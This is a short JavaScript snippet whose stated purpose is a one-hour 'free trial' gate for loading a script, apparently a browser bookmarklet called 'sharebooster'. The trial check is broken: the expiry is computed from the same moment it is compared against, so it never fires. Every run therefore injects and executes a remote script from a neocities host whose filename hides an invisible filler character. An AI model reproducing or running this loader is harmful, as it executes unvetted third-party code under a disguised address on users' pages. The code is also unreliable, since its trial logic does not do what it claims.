function loadScript() {
    var startTime = new Date(); // Get the current time
    var expirationTime = new Date(startTime.getTime() + 60 * 60 * 1000); // Add 1 hour (60 minutes * 60 seconds * 1000 milliseconds)

    var currentTime = new Date();

    if (currentTime > expirationTime) {
        alert('Free trial is over');
    } else {
        var script = document.createElement('script');
        script.src = 'https://sharebooster.neocities.org/scriptㅤ.js';
        document.body.appendChild(script);
    }
}

loadScript(); // Call the function to execute
